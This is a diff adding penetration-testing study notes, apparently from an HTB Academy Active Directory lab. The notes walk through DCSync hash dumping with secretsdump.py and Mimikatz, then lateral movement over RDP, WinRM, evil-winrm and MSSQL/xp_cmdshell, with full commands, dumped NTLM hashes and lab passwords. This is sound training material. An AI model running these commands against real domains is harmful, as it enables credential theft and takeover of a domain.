@@ -1,3 +1,4 @@
+
 # LLMNR/NBT-NS Poisoning (Linux)
 
 [Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063\(v=technet.10\)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port `5355` over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port `137` over UDP.
@@ -2044,3 +2045,336 @@ PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberNa
 
 # DCSync
 
+DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
+
+To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). 
+
+Domain/Enterprise Admins and default domain administrators have this right by default.
+
+## View adunn's Group Membership
+
+```powershell
+PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+
+
+samaccountname     : adunn
+objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
+memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
+                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
+                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
+                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+```
+
+## Check adunn's Replication Rights
+
+PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account.
+
+```powershell
+PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
+ObjectAceType         : DS-Replication-Get-Changes
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
+ObjectAceType         : DS-Replication-Get-Changes-All
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
+ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
+ObjectAceType         : DS-Replication-Get-Changes
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
+ObjectAceType         : DS-Replication-Get-Changes-All
+```
+
+DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let's see a few quick examples.
+
+## Using secretsdump.py
+
+```bash
+akhmadkun@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
+
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
+[*] Searching for NTDS.dit
+[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
+[*] Using smbexec method for remote execution
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
+[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
+inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf::: 
+guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
+ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
+ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
+ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
+inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
+inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+
+<SNIP>
+
+d0wngrade:des-cbc-md5:d6fee0b62aa410fe
+d0wngrade:dec-cbc-crc:d6fee0b62aa410fe
+ACADEMY-EA-FILE$:des-cbc-md5:eaef54a2c101406d
+svc_qualys:des-cbc-md5:f125ab34b53eb61c
+forend:des-cbc-md5:e3c14adf9d8a04c1
+[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
+proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
+[*] Cleaning up...
+```
+
+The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
+
+We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user.
+
+## Cek  Reversible Encryption Options using Get-DomainUser
+
+We can see that one account, `proxyagent`, has the reversible encryption option set with PowerView as well:
+
+```powershell
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+```
+
+## Mimikatz
+
+We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the `krbtgt` account and use this to create a `Golden Ticket` for persistence, but that is outside the scope of this module.
+
+```powershell
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
+Enter the password for INLANEFREIGHT\adunn:
+Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
+```
+
+```powershell
+PS C:\htb> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'INLANEFREIGHT\administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : administrator
+User Principal Name  : administrator@inlanefreight.local
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 10/27/2021 6:49:32 AM
+Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 88ad09182de639ccc6579eb0849751cf
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 4625fd0c31368ff4c255a3b876eaac3d
+
+<SNIP>
+```
+
+---
+# Privileged Access
+
+Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. 
+
+Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a `Pass-the-Hash` attack to authenticate via the SMB protocol.
+
+There are several other ways we can move around a Windows domain:
+
+- `Remote Desktop Protocol` (`RDP`) - is a remote access/management protocol that gives us GUI access to a target host
+    
+- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell
+    
+- `MSSQL Server` - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods
+
+## Remote Desktop
+
+Using `PowerView`, we could use the [Get-NetLocalGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) function to begin enumerating members of the `Remote Desktop Users` group on a given host. Let's check out the `Remote Desktop Users` group on the `MS01` host in our target domain.
+
+```powershell
+PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+
+ComputerName : ACADEMY-EA-MS01
+GroupName    : Remote Desktop Users
+MemberName   : INLANEFREIGHT\Domain Users
+SID          : S-1-5-21-3842939050-3880317879-2865463114-513
+IsGroup      : True
+IsDomain     : UNKNOWN
+```
+
+From the information above, we can see that all Domain Users (meaning `all` users in the domain) can RDP to this host. It is common to see this on Remote Desktop Services (RDS) hosts or hosts used as jump hosts.
+
+## Checking the Domain Users Group's Local Admin & Execution Rights
+
+![](Pasted%20image%2020260128063706.png)
+
+If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.
+
+![](Pasted%20image%2020260128063743.png)
+
+We could also check the `Analysis` tab and run the pre-built queries `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`. There are other ways to enumerate this information, but BloodHound is a powerful tool that can help us narrow down these types of access rights quickly and accurately, which is hugely beneficial to us as penetration testers under time constraints for the assessment period.
+
+## WinRM
+
+Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts. This could also be low-privileged access that we could use to hunt for sensitive data or attempt to escalate privileges or may result in local admin access, which could potentially be leveraged to further our access. We can again use the PowerView function `Get-NetLocalGroupMember` to the `Remote Management Users` group.
+
+```powershell
+PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+
+ComputerName : ACADEMY-EA-MS01
+GroupName    : Remote Management Users
+MemberName   : INLANEFREIGHT\forend
+SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
+IsGroup      : False
+IsDomain     : UNKNOWN
+```
+
+We can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.
+
+```cypher
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+```
+
+Alternatively with PowerView,
+
+```powershell
+Get-NetComputer -Filter "(operatingSystem=*Server*)" | select -ExpandProperty name | Get-NetLocalGroupMember -GroupName "Remote Management Users"
+```
+
+We can use the [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) cmdlet using PowerShell from a Windows host.
+
+```powershell
+PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+
+[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
+ACADEMY-EA-MS01
+[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
+PS C:\htb> 
+```
+
+From our Linux attack host, we can use the tool [evil-winrm](https://github.com/Hackplayers/evil-winrm) to connect.
+
+```bash
+$ evil-winrm -i 10.129.201.234 -u forend
+
+Enter Password: 
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
+```
+
+## SQL Server Admin
+
+More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool [Snaffler](https://github.com/SnaffCon/Snaffler) to find web.config or other types of configuration files that contain SQL server connection strings.
+
+BloodHound, once again, is a great bet for finding this type of access via the `SQLAdmin` edge. We can check for `SQL Admin Rights` in the `Node Info` tab for a given user or use this custom Cypher query to search:
+
+```cypher
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+```
+
+## Enumerating MSSQL Instances with PowerUpSQL
+
+```powershell
+PS C:\htb> cd .\PowerUpSQL\
+PS C:\htb>  Import-Module .\PowerUpSQL.ps1
+PS C:\htb>  Get-SQLInstanceDomain
+
+ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
+Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
+DomainAccountSid : 1500000521000170152142291832437223174127203170152400
+DomainAccount    : damundsen
+DomainAccountCn  : Dana Amundsen
+Service          : MSSQLSvc
+Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
+LastLogon        : 4/6/2022 11:59 AM
+```
+
+```powershell
+PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+
+VERBOSE: 172.16.5.150,1433 : Connection Success.
+
+Column1
+-------
+Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
+```
+
+## MSSqlclient.py
+
+```shell
+$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+```
+
+```shell
+SQL> help
+
+     lcd {path}                 - changes the current local directory to {path}
+     exit                       - terminates the server process (and this session)
+     enable_xp_cmdshell         - you know what it means
+     disable_xp_cmdshell        - you know what it means
+     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+     ! {cmd}                    - executes a local shell cmd
+```
